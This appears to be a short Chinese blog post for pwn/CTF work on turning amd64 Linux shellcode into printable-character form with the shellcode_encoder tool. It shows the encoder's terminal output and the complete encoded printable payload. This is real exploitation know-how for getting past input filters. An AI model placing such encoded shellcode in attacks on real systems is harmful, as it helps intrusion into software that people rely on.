---
layout:     post
title:      linux-amd64-printable-shellcode
subtitle:   linux-amd64-shellcode
date:       2019-8-29
author:     lycium
header-img: 
catalog: true
tags:
    - pwn
    - linux
    
---


# amd64 linux printable shellcode

amd64 linux shellcode的编写很简单有很多的工具，pwntools，roputils可以帮助我们十分方便的生成shellcode。
在一些非常限制的应用中我们要使用printable shellcode。
一下工具配合asm生成工具可以轻松生成shellcode
```
https://github.com/ecx86/shellcode_encoder
```
这个工具可以轻松地帮你把你的shellcode编码成printable shellcode。一下是一个shellcode生成样例。
```
lee@ubuntu:~/Desktop/shellcode_encoder$ python2 ./main.py ../bbb rsi+29
Encoding stage2
488b0432 => 4863343a31343a53582d702835332d74205f5f35543c6f5f505e31343a57582d7c6f3f7e2d405042402d40407e41505f
480faf44 => 4863343a31343a53582d505040792d743020693574703059505e31343a57582d7c6f3f7e2d405042402d40407e41505f
32084889 => 4863343a31343a53582d244874202d5f606c20354f5f5736505e31343a57582d7c6f3f7e2d405042402d40407e41505f
043a83c7 => 4863343a31343a53582d402233402d706020203554472f58505e31343a57582d7c6f3f7e2d405042402d40407e41505f
0883c610 => 4863343a31343a53582d403346322d7020207e35582f5f5f505e31343a57582d7c6f3f7e2d405042402d40407e41505f
85c075e8 => 4863343a31343a53582d204775202d202160403545575f77505e31343a57582d7c6f3f7e2d405042402d40407e41505f
Multiply-encoding stage3
686f630101813424 => 5c4e6a5a504a594c 36563f2460304142
0101010148b86861 => 6d4f57283f59306d 65774f3652384a6c
6f2068616f205048 => 3b3e76375e3a5575 5d3f39652a257453
89e66a015f6a095a => 297c4a647b7e3e2a 61637e3f6e434845
ffc26a01580f0590 => 697c646939314b60 27772f765034442c
Assembling jump at +408

Encoding preamble for rdx <- rsi+29
VPTAYAXVI31VXXXf-sof-0Pf-@@PZ

Original length: 39
Encoded length:  492
Preamble length: 29
Total length:    521

VPTAYAXVI31VXXXf-sof-0Pf-@@PZTAYAXVI31VXPP[_Hc4:14:SX-p(53-t __5T<o_P^14:WX-|o?~-@PB@-@@~AP_Hc4:14:SX-PP@y-t0 i5tp0YP^14:WX-|o?~-@PB@-@@~AP_Hc4:14:SX-$Ht -_`l 5O_W6P^14:WX-|o?~-@PB@-@@~AP_Hc4:14:SX-@"3@-p`  5TG/XP^14:WX-|o?~-@PB@-@@~AP_Hc4:14:SX-@3F2-p  ~5X/__P^14:WX-|o?~-@PB@-@@~AP_Hc4:14:SX- Gu - !`@5EW_wP^14:WX-|o?~-@PB@-@@~AP_SX- `Ba- @BA5X^{]P_Hc4:14:SX-*90 -E'  5n}?/P^14:WX-|o?~-@PB@-@@~AP_SX- `@a- @PA5\^o]P^SX-@@@"-y``~5____P_AAAA\NjZPJYL6V?$`0ABmOW(?Y0mewO6R8Jl;>v7^:Uu]?9e*%tS)|Jd{~>*ac~?nCHEi|di91K`'w/vP4D,
```
记得注意指点，我们要多次调整最后一个指针，时候执行shellcode时指针的值和"Preamble length"相等。切记切记。